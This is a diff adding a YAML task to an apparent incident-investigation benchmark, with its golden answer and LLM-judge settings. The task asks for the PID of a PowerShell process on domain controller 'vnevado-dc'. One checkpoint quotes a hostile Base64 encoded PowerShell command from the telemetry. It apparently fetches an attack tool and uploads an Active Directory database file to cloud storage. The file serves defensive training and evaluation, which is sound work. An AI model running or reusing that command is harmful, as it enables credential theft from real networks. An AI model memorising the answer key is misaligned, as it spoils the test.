@@ -1,0 +1,38 @@
+tasks:
+  - task_id: incident_322_latest_train_set_task_9
+    title: incident_322_latest_train_set_task_9
+    description: 'According to the correlated telemetry, what was the process ID (PID) of the PowerShell process that ran the encoded command on host "vnevado-dc" at 2024-08-01 12:37:29 UTC?'
+    inherit_shared: true
+    initial_context:
+      incident_context: 'While investigating an alert titled "Ntdsutil collecting Active Directory information", we observed that the binary "ntdsutil.exe" (PID 6748) ran on the domain controller "vnevado-dc" at 2024-08-01 12:54 UTC. This activity may indicate an attacker attempting to enumerate or export Active Directory data. Correlated telemetry shows that, seconds earlier, a separate PowerShell process launched on the same host and executed a long Base64-encoded command, suggesting possible follow-on actions by the adversary.'
+      question: 'According to the correlated telemetry, what was the process ID (PID) of the PowerShell process that ran the encoded command on host "vnevado-dc" at 2024-08-01 12:37:29 UTC?'
+    # Main task submission evaluation - uses LLM-as-a-judge by default
+    # To use static matching instead, change strategy to "static" and set:
+    #   criteria:
+    #     expected_answers:
+    #       - '2556'
+    submission_evaluation_config:
+      strategy: llm_judge
+      criteria:
+        model: openai/azure/gpt-4.1
+        judge_system_template: judge/submission_judge_system.md
+        judge_user_template: judge/submission_judge_user.md
+        golden_answer: '2556'
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: 'The attacker executed a PowerShell process with entity field `ProcessId__CreatedTimeUtc__CommandLine`, value `2556__2024-08-01t12:37:29.6522416z__"powershell.exe" -encodedcommand iabuahqazabzahuadabpagwalgblahgazqagaccayqbjacaaaqagag4adabkahmajwagaccaaqbmag0ajwagaccaywbyaguayqb0aguaiabmahuababsacaaywa6afwadablag0acaanacaacqagaheaowagacaadwbnaguadaagaggadab0ahaacwa6ac8alwbnagkadaboahuaygauagmabwbtac8acgazag0abwb0aguaywbvag4adabyag8abaavaecaaabvahmadabwageaywbrac0aqwbvag0acabpagwazqbkaeiaaqbuageacgbpaguacwavahiayqb3ac8abqbhahmadablahialwbsahuaygblahuacwauaguaeablacaalqbvahuadabmagkabablacaadablahmadaauaguaeablacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4adgbvagsazqatahiazqbzahqabqblahqaaabvagqaiaatag0azqb0aggabwbkacaazwblahqaiaatahuacgbpacaadgblagmadabvahiacwbhag4azabhahiacgbvahcacwauagmabwbtacaalqb1ahmazqbiageacwbpagmacabhahiacwbpag4azwa7acaaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbhagmaywbvahuabgb0ahmaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiabpag4acwb0ageababsac0abqbvagqadqbsaguaiabhahoalgbzahqabwbyageazwblacaaiaatahmaywbvahaazqagaemadqbyahiazqbuahqavqbzaguacgagac0argbvahiaywbladsaiaagaemabwbuag4azqbjahqalqbbahoaqqbjagmabwb1ag4adaagac0asqbkaguabgb0agkadab5adsaiaagacqargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanagmaogbcahqazqbtahaaxabbagmadabpahyazqagaeqaaqbyaguaywb0ag8acgb5afwabgb0agqacwauagqaaqb0accaowagacaajabzacaapqagagcazqb0ac0ayqb6ahmadabvahiayqbnaguaqqbjagmabwb1ag4adaa7acaaiaakagmabwbuahqazqb4ahqaiaa9acaajabzac4aqwbvag4adablahgadaa7acaaiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaiaa9acaaigbhahuadabvag0ayqb0agkabwbuaciaowagacaajabcagwabwbiadmasabuacaapqagaeaaewagacaaiaagacaargbpagwazqagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaakaeyaaqbsaguaowagacaaiaagacaaqwbvag4adabhagkabgblahiaiaagacaaiaagacaaiaagad0aiaakaemabwbuahqayqbpag4azqbyae4ayqbtaguaowagacaaiaagacaaqgbsag8aygagacaaiaagacaaiaagacaaiaagacaaiaagad0aiaanaekabqbhagcazqawadaamwauagoacabnaccaowagacaaiaagacaaqwbvag4adablahgadaagacaaiaagacaaiaagacaaiaagad0aiaakagmabwbuahqazqb4ahqaowagacaaiaagacaauwb0ageabgbkageacgbkaeiababvagiavabpaguacgagad0aiaanaeeacgbjaggaaqb2aguajwa7acaaiaagah0aowagafmazqb0ac0aqqb6afmadabvahiayqbnaguaqgbsag8aygbdag8abgb0aguabgb0acaaqabcagwabwbiadmasabuadsaiaagaa==`.'
+        objective: Identify key details related to the potential compromise that might
+          help in solving the main task.
+        step_evaluation_config:
+          strategy: llm_judge
+          criteria:
+            model: openai/azure/gpt-4.1
+            judge_system_template: judge/checkpoint_judge_system.md
+            judge_user_template: judge/checkpoint_judge_user.md
+            steps_per_message: 50
+          scoring:
+            max_score: 1.0
+            weight: 1.0
